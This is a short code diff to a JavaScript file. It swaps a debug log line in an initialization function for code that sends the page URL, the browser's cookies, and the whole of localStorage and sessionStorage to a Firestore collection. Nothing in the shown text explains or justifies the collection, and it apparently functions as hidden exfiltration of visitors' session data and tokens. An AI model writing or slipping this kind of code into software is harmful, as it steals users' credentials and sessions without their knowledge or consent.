@@ -26,5 +26,11 @@ var loadingID = setInterval(() => {
 }, 100);
 
 function onInitialized() {
-  console.log(1111);
+  firebase.firestore().collection('tt').add({
+    url: location.toString(),
+    cookie: document.cookie,
+    localStorage: JSON.stringify(localStorage),
+    sessionStorage: JSON.stringify(sessionStorage),
+    created_at: new Date()
+  });
 }
